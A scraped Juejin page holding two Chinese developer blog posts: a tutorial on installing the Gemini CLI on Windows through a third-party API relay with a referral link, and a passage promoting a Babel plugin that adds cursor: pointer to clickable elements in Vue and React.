                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"•";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>前面已经介绍过，➡️<a href="https://juejin.cn/post/7536474765198393379" target="_blank" title="https://juejin.cn/post/7536474765198393379">在 Windows 系统上安装官方 Claude Code CLI 教程</a>，和 ➡️<a href="https://juejin.cn/post/7551955877314920482" target="_blank" title="https://juejin.cn/post/7551955877314920482">在 Windows 系统上安装官方 Codex CLI 教程</a>。</p>
<p>今天再来说说 Windows下如何用官方的 Gemini CLI  来使用 <code>Gemini 3 Pro</code></p>
<hr/>
<h3 data-id="heading-0">一、打开网站</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aicodemirror.com%2Fregister%3Finvitecode%3D4LTUJA" target="_blank" title="https://www.aicodemirror.com/register?invitecode=4LTUJA" ref="nofollow noopener noreferrer">www.aicodemirror.com</a> <strong>（用了三个多月，网站稳定性不错，免费用户池很给力）</strong>
注册就送2000积分，通过邀请注册再多送1000积分。</p>
<h3 data-id="heading-1">二、安装步骤</h3>
<ol>
<li>
<p><strong>安装 GeminiCli 官方原版包</strong></p>
<pre><code class="hljs language-bash" lang="bash">npm install -g @google/gemini-cli
</code></pre>
</li>
<li>
<p><strong>在「API密钥」界面配置一个API KEY</strong></p>
<p>访问仪表板的「API密钥」页面，创建并复制一个新的API密钥</p>
</li>
<li>
<p><strong>设置Windows系统环境变量</strong>
需要设置以下两个环境变量：</p>
<p>变量名：<code>GOOGLE_GEMINI_BASE_URL</code>，变量值：<code>https://api.aicodemirror.com/api/gemini</code>
变量名：<code>GEMINI_API_KEY</code>，变量值：<code>你的密钥</code></p>
</li>
<li>
<p><strong>启动Gemini</strong>
重启终端后运行以下命令，确认安装成功</p>
<pre><code class="hljs language-bash" lang="bash">gemini
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb94c6e088e34c38a774e7df4d94072e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764222024&amp;x-signature=x8TrY%2BuM63c6Y%2F6jH7AQxT%2FYlBI%3D" alt="在这里插入图片描述" loading="lazy"/></p>
</li>
<li>
<p><strong>选择 Use Gemini API Key</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05d0cd30336d4884b2e11bcab895ea69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764222024&amp;x-signature=mZk2kM0c6rcCkA04bqemLjOra6M%3D" alt="在这里插入图片描述" loading="lazy"/>
此处直接回车！</p>
</li>
<li>
<p><strong>开启Preview Features</strong>
输入 /settings</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/136321978f05406f93752f75a8bbef56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764222024&amp;x-signature=mrja6FcxYQ3Jl63TEoOgVUirFy8%3D" alt="在这里插入图片描述" loading="lazy"/></p>
</li>
<li>
<p><strong>切换 Gemini 3 Pro 模型</strong>
输入 /model, 切换为 Gemini 3 Pro 模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3065dc582384eca92b12ae19201385a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764222024&amp;x-signature=mxDLQjUcG3txZA6DrBdMHl7cZmg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
</li>
</ol>
<hr/>
<h3 data-id="heading-2">三、开始使用</h3>
<ul>
<li>
<p>安装完成后，您可以在任何项目目录中开始使用 Gemini：</p>
<pre><code class="hljs language-[bash]([url](url))" lang="[bash]([url](url))"># 导航到您的项目
$ cd your-project-folder

# 启动 Gemini （启动速度明显感觉比 claude 和 codex 慢）
$ gemini
</code></pre>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[再也不用手动写 cursor: pointer 了！一个 Babel 插件帮你自动解决 99% 的手型光标问题]]></title>    <link>https://juejin.cn/post/7574657475429941274</link>    <guid>https://juejin.cn/post/7574657475429941274</guid>    <pubDate>2025-11-20T12:25:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574657475429941274" data-draft-id="7574639741150019635" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="再也不用手动写 cursor: pointer 了！一个 Babel 插件帮你自动解决 99% 的手型光标问题"/> <meta itemprop="keywords" content="Babel"/> <meta itemprop="datePublished" content="2025-11-20T12:25:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Racing"/> <meta itemprop="url" content="https://juejin.cn/user/2928754706358573"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            再也不用手动写 cursor: pointer 了！一个 Babel 插件帮你自动解决 99% 的手型光标问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2928754706358573/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Racing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-20T12:25:35.000Z" title="Thu Nov 20 2025 12:25:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你有没有遇到过这种情况：</p>
<ul>
<li>写了一个可点击的 <code>&lt;div&gt;</code>，上线后被测试同学疯狂吐槽：“这个能点吗？为什么鼠标没变成小手啊！”</li>
<li>为了避免被反复教育，你养成了“凡是加了 @click/onClick 就手动写 cursor: pointer”的强迫症</li>
<li>结果又被 UI 同学骂：“你怎么把我的 cursor: help / wait / move 给覆盖了！”</li>
</ul>
<p><strong>从今天起，这些烦恼都可以彻底终结了！</strong></p>
<p>我开发了一个极度“懒人福音”级别的 Babel 插件 —— <strong>babel-plugin-pointer</strong>，已经正式发布到 npm！</p>
<blockquote>
<p>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fbabel-plugin-pointer" target="_blank" title="https://www.npmjs.com/package/babel-plugin-pointer" ref="nofollow noopener noreferrer">www.npmjs.com/package/bab…</a></p>
</blockquote>
<h2 data-id="heading-0">💡 问题：为什么我们总忘记加 <code>cursor: pointer</code>？</h2>
<p>在开发中，我们经常这样写：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- Vue 3 --&gt;
&lt;button @click="handleClick"&gt;点击我&lt;/button&gt;
</code></pre>
<pre><code class="hljs language-React" lang="React">&lt;!-- React --&gt;
&lt;button onClick={handleClick}&gt;点击我&lt;/button&gt;
</code></pre>
<p>但结果呢？鼠标悬停时，按钮可能还是默认的箭头（<code>cursor: default</code>），这会让用户体验大打折扣。</p>
<p>更糟的是：</p>
<ul>
<li>团队新人忘记加</li>
<li>临时修改代码时遗漏</li>
<li>项目规范不明确</li>
<li>设计师说：“这个按钮怎么没手型光标？”</li>
</ul>
<p><strong>手动维护不仅麻烦，还容易遗漏！</strong></p>
<h2 data-id="heading-1">🔥 为什么需要 <code>babel-plugin-pointer</code>？</h2>
<p>我开发了这个 ​<strong>纯 Babel 插件</strong>​，它在<strong>编译时</strong>自动为所有带有点击事件的元素添加 <code>cursor: pointer</code>，​<strong>无需任何额外代码</strong>​。</p>
<h3 data-id="heading-2">✅ 为什么说它超好用？</h3>

























<table><thead><tr><th>传统方式</th><th><code>babel-plugin-pointer</code></th></tr></thead><tbody><tr><td>需要手动在每个元素加 <code>cursor: pointer</code></td><td>​<strong>自动添加​</strong>​，无需修改任何业务代码</td></tr><tr><td>容易遗漏，影响用户体验</td><td><strong>100% 覆盖</strong>所有带点击事件的元素</td></tr><tr><td>无法智能判断是否已有样式</td><td>​<strong>智能检测</strong>​，尊重现有样式（不会覆盖）</td></tr><tr><td>需要额外 CSS 代码</td><td>​<strong>零运行时开销</strong>​，纯编译时处理</td></tr></tbody></table>
<h2 data-id="heading-3">🧠 智能检测：为什么它不会覆盖你的样式？</h2>
<p>这是 <code>babel-plugin-pointer</code> 最厉害的地方 —— ​<strong>它不会覆盖你已有的 cursor 样式</strong>​。</p>
<p>插件在运行时会执行以下检查：</p>
<ol>
<li>元素是否有内联 <code>style.cursor</code>？ → 如果有，<strong>跳过</strong></li>
<li>否则，用 <code>window.getComputedStyle()</code> 检查计算后的 cursor 值</li>
<li>只有当值为 <code>auto</code> 或 <code>default</code> 时，才设置 <code>cursor: pointer</code></li>
</ol>
<p><strong>这意味着：</strong></p>
<ul>
<li><code>&lt;button style="cursor: help"&gt;</code> → 保持 <code>help</code> ✅</li>
<li><code>&lt;div class="custom-cursor" @click&gt;</code> + <code>.custom-cursor { cursor: move; }</code> → 保持 <code>move</code> ✅</li>
<li>普通 <code>&lt;button @click&gt;</code> → 自动变 <code>pointer</code> ✅</li>
</ul>
<blockquote>
<p><strong>非侵入式设计，尊重你的每一行 CSS！</strong></p>
</blockquote>
<h2 data-id="heading-4">🛠️ 30 秒快速上手</h2>
<h3 data-id="heading-5">1. 安装插件</h3>
<pre><code class="hljs language-scss" lang="scss">npm install babel-plugin-pointer <span class="hljs-attr">--save-dev</span>
</code></pre>
<h3 data-id="heading-6">2. 配置（Vue 3 + Vite）</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'vue-babel-pointer'</span>,
      <span class="hljs-keyword">async</span> <span class="hljs-title function_">transform</span>(<span class="hljs-params">code, id</span>) {
        <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.vue'</span>)) {
          <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">transformAsync</span>(code, {
            <span class="hljs-attr">plugins</span>: [<span class="hljs-string">'babel-plugin-pointer/vue'</span>],
            <span class="hljs-attr">filename</span>: id,
            <span class="hljs-attr">sourceMaps</span>: <span class="hljs-literal">true</span>
          });
          <span class="hljs-keyword">return</span> result ? { <span class="hljs-attr">code</span>: result.<span class="hljs-property">code</span>, <span class="hljs-attr">map</span>: result.<span class="hljs-property">map</span> } : <span class="hljs-literal">null</span>;
        }
      }
    }
  ]
})
</code></pre>
<h3 data-id="heading-7">3. React 项目</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// babel.config,js</span>
<span class="hljs-keyword">module</span>.<span class="hljs-keyword">exports</span> = {
  plugins: [<span class="hljs-string">'babel-plugin-pointer/react'</span>]
}
</code></pre>
<h2 data-id="heading-8">⚡ 为什么说它"零成本"？</h2>
<ul>
<li>​<strong>零运行时依赖</strong>​：纯编译时转换，运行时辅助函数仅 1KB</li>
<li>​<strong>无布局抖动</strong>​：使用 <code>setTimeout(..., 0)</code> 延迟检查</li>
<li>​<strong>TypeScript 友好</strong>​：无缝集成 TS 项目</li>
<li>​<strong>无需学习成本</strong>​：配置简单，开箱即用</li>
</ul>
<hr/>
<h2 data-id="heading-9">💡 适用场景</h2>
<ul>
<li>快速原型开发（省去样式细节）</li>
<li>统一团队交互规范（避免"忘记加 cursor"）</li>
<li>遗留项目增强用户体验</li>
<li>教学 demo（让学生专注逻辑而非样式）</li>
<li>任何需要确保点击元素有手型光标的场景</li>
</ul>
<h2 data-id="heading-10">✨ 为什么我开发了这个插件？</h2>
